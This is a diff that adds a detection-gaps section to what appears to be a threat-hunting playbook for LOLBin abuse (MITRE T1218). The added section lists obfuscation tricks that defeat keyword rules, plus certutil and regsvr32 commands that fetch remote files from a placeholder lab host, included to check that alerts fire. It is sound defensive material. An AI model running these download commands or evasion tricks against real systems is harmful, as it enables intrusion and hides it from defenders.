@@ -38,6 +38,14 @@ nist_csf:
 - During purple team exercises testing detection of defense evasion techniques
 - When assessing endpoint detection coverage for MITRE ATT&CK T1218 sub-techniques
 
+## Detection Gaps & Validation
+
+- **4688 lacks `OriginalFileName`.** Renamed-LOLBin detection (e.g., `certutil.exe`→`update.exe`) requires Sysmon EID 1 `OriginalFileName`/`Hashes`; relying on Security 4688 alone misses it. Also confirm command-line auditing is on, or the `CommandLine` field is blank and every keyword rule silently fails.
+- **Keyword/regex lists miss obfuscation:** caret/quote insertion (`c^ertu^til`, `"certutil"`), env-var expansion (`%COMSPEC%`), and base64 `-enc` defeat literal matches.
+- **Long-tail LOLBins absent from watchlists:** `msdt.exe`, `desktopimgdownldr.exe`, `finger.exe`, `forfiles.exe`, `mavinject.exe` (T1218 sub-techniques).
+- **Validate the hunt fires:** run `certutil -urlcache -split -f http://<lab>/x.txt` and `regsvr32 /s /n /u /i:http://<lab>/x.sct scrobj.dll` (Atomic T1218.010); confirm the Splunk/Sigma rule alerts and Sysmon EID 3 correlates the outbound connection.
+- **FP tuning:** legitimate admin/installer use of these binaries — baseline by parent process, signer, execution path, and frequency before alerting.
+
 ## Prerequisites
 
 - Sysmon Event ID 1 (Process Creation) with full command-line logging
